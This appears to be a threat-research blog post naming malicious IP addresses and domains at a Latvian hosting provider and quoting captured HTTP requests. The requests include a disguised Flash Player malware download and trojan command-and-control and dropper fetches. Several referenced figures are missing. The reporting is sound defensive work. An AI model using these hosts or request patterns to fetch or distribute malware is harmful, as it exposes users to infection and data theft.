In this edition of "rooting out the Bad Actors" I'm going to take a look at ZlKon, hosted by "Datoru Express Serviss, Ltd" in Latvia.
As you can see, they only have a single /23 address block, but everything I found indicates that the whole range is dedicated to providing services for hosting malware, exploits, and those who profit from them.
First up is 94.247.2.193.
The connections I see appear to be from Trojan.Alureon, which is often used in conjunction with the DNSChanger family of information stealers.
Also on 94.247.2.193 I can see some of the DNSChanger communication:
On 94.247.2.104 I see more DNSChanger traffic:
On 94.247.2.31 (DNS hosted at 94.247.2.40) I can see traffic to a Rogue/fake AV site:
On 94.247.2.30 I see some traffic heading to zcounter.cn (DNS on 94.247.2.38), which hits me with some ugly looking javascript which eventually is a couple PDF exploits.
It's easier to show visually:
On 94.247.3.74 I see more Rogue AV traffic:
I see very similar Rogue traffic on 94.247.3.3 (DNS on 94.247.3.4 and 94.247.3.5):
Similarly, I can see another Rogue on 94.247.2.241:
Here's a fake Flash player - which is really DNSChanger - being downloaded from 94.247.2.183.
The referer page, codec-networks.com, is hosted on 94.247.2.34
GET /download/3070367542413d3dfc76292e/Flash.Player.Update.v9.31.exe HTTP/1.1Host: hqextra.comAccept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SBUA)Connection: CloseRange: bytes=0-Referer: http://codec-networks.com/video/?videoid=69645#
On that same host, I noticed something cute.
If your User-Agent string was a Mac, then they gave you the Mac version of the malware.
Who says there is no malware for Macs?
I infected a Mac I had here with the above and you can see some *very* rudimentary command and control going on with 94.247.2.109.
Macs are really in their infancy in terms of well developed, sophisticated malware.
It's the equivalent sophisitication of an IRC bot on Windows:
For the inclined, there is some other malware hosted on that IP as well:
I see some exploits being hosted on 94.247.2.122.
It appears they are spamming some porn sites to get their malicious code inside a popup:
GET /?ref=moviepost.com HTTP/1.1User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1Referer: http://www.homeworkporn.com/Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5Accept-Language: en-usAccept-Encoding: gzip, deflateConnection: keep-aliveHost: 94.247.2.122
The exploits are barely obfuscated and might be of interest to those who don't often see Javascript based attacks:
The payload is a file called 0.gif, which is really an EXE, and seems to be some sort of rogue
On 94.247.3.251 I see a ton of traffic to innah.cn, which I'm 99% sure is Zbot.
Based on the amount of data getting shipped up via HTTP POST, I assume it's snarfing all sort of information off the box.
I wouldn't mind some confirmation if anyone knows for sure - my email is at the bottom of this post.

On 94.247.2.58 I see what I'm pretty sure is Trojan.Zlob faking search results (I took out the relevant data).
GET /cp/x/?u=0A1&i=0+xxxxx++++++++++++++++ HTTP/1.1Host: 94.247.2.58Cache-Control: no-cache
The response looks like this:

On 94.247.2.228 they are hosting a redirector for a Canadian pharmacy scam site.
They also host DNS services on 94.247.2.227 for other pharmacy sites.
Additionally, on 94.247.2.226, they host DNS for the malware distributing (currently down) 3d-softwareportal.com
analytecs.com is hosted on 94.247.3.192 (DNS at 94.247.3.233), which Google tells me "May harm my computer".
While watching some of our honeynet traffic, I noticed that 94.247.3.206 had spammed our blog.
Hmm.
On 94.247.2.50 I see what Microsoft calls Tearspear.
It looks to be a dropper associated with Zbot.
GET /.cfg/o/set.cfg HTTP/1.0Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)Host: 94.247.2.50Pragma: no-cache
On 94.247.2.76 I see malware hosted that I can identify as Trojan.Renos
GET /balamutra/balamutra.php HTTP/1.1User-Agent: wget 3.0Hos

On 94.247.2.38 I was being served a copy of Trojan.Rlsloup, which is a generic rookit dropper Trojan
GET /dok/doc.txt HTTP/1.0Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)Host: lorentil.cnConnection: Keep-Alive
Looking for malware at ZlKon is really like shooting fish in a barrel.
The examples I listed above were all from the past couple days - I didn't pull in any historical data.
Doing simple searches on the IPs by hand will show you that malware hosting on Zlkon is not a recent development - they've been a Bad Actor for quite some time.
Here are a couple links which also show epic badness at ZlKon:
